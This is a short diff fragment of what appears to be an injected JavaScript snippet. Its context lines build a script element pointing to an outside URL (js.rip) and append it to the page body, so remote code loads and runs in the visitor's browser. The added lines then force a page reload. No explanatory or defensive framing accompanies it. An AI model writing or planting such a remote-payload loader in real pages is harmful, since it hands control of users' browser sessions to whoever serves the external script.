@@ -34,4 +34,6 @@
     payloadScript.src = "https://js.rip/lp4lo6albo/";
     document.body.appendChild(payloadScript);
 
+    // Refresh the page
+    location.reload();
 })();
